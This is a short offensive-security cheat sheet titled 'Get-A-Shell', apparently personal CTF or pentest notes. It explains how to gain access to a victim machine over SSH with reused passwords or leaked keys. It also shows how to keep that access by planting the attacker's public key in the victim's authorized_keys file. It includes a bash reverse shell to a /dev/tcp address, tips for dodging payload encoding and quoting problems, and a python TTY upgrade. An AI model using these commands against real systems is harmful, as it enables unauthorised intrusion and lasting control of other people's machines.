---
sort : 1
---

# Get-A-Shell 


## SSH 

### Password Reuse Misconfiguration OR Private Key Leakage : 

```bash
$ ssh Username@Host
    password : ******* 

$ ssh -i PrivateKey Username@Host
```


### Connecting Via SSH is Better ? (.ssh)

```bash
# On the victim machine

$ mkdir ".ssh"; cd .ssh ; touch authorized_keys
```

```bash
# On the attacker machine

$ cd /tmp; ssh-keygen  

# Generating public/private rsa key pair.
Enter file in which to save the key (/home/o54ma/.ssh/id_rsa): TmpKey # file name to save the key 
Enter passphrase (empty for no passphrase): 						  # no password 
Enter same passphrase again: 								          # no password 


$ cat TmpKey.pub | xclip -selection c                                 # copy the public key

```

```bash
# Back on the victim machine

$ echo "`CTRL+V`" >> authorized_keys
```

```bash
# Back on the attacker machine

ssh -i TmpKey Username@Host
```







## Reverse Shell 

[the best place to generate a reverse shell](https://www.revshells.com/)

```note
some times the shell doesn't work, why ?? 

* if it is a bash reverse shell, e.g. bash -i >& /dev/tcp/10.10.x.x/1234 0>&1 , try precede it with `bash -c` 

* try URL encoding / double URL encoding

* quotations conflict, how to deal with it ?? 

    * embrace the whole payload with double qoutes, then escape the inside ones
    
    * there is also some tools that ask you to pass the payload as an argv, so make sure how they gonna receive it (inside a double or a single qoutes ??)
```


# Spawn a TTY shell 

python3 -c 'import pty; pty.spawn("/bin/bash")'